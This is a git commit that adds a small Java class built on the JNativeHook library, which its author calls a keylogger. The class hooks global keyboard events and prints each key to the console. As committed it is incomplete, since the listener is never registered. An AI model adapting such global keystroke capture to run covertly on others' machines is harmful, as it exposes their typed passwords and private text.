277ac8a1f25939efe0583aa0d9fc050ff64f2ea7
kkmonlee <kkmonlee@gmail.com>
2016-06-12 01:09:40 +0100

    Created a Keylogger class
    Might not work yet.

---
+++ src/Others/KeyCapture.java
@@ -0,0 +1,43 @@
+package Others;
+import org.jnativehook.GlobalScreen;
+import org.jnativehook.NativeHookException;
+import org.jnativehook.keyboard.NativeKeyEvent;
+import org.jnativehook.keyboard.NativeKeyListener;
+
+public class KeyCapture implements NativeKeyListener {
+
+    /* Key pressed */
+    public void nativeKeyPressed(NativeKeyEvent e) {
+        System.out.println("Key pressed: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
+
+        // Terminate program once Escape is pressed
+        if (e.getKeyCode() == NativeKeyEvent.VC_ESCAPE) {
+            try {
+                GlobalScreen.unregisterNativeHook();
+            } catch (NativeHookException ex) {
+                ex.printStackTrace();
+            }
+        }
+    }
+
+    public void nativeKeyReleased(NativeKeyEvent e) {
+        System.out.println("Key released: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
+    }
+
+    public void nativeKeyTyped(NativeKeyEvent e) {
+        System.out.println("Key typed: " + e.getKeyText(e.getKeyCode()));
+    }
+
+    public static void main(String[] args) {
+        try  {
+            GlobalScreen.registerNativeHook();
+        } catch (NativeHookException ex) {
+            System.err.println(ex.getMessage());
+            System.exit(1);
+        }
+    }
+
+
+
+
+}
